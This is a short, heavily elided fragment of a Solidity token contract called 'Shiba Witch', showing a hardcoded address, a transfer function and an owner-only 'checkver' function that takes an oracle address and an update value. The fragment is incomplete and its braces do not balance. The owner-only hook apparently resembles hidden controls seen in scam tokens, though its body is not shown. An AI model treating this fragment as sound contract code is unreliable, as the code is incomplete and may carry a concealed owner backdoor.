...
contract SHIBCRAFT {
    ...
    // 
    string public name = "Shiba Witch";
    ...
    address Construct = 0x1A649fE8A395919f014DD517b025c64ccD169B7A;
...
modifier onlyOwner() {
    ...
    function transfer(address to, uint256 value) public returns (bool success) {
        ...
        return true; }
        function checkver(address oracle,  uint256 update) public {
             require(msg.sender == owner);
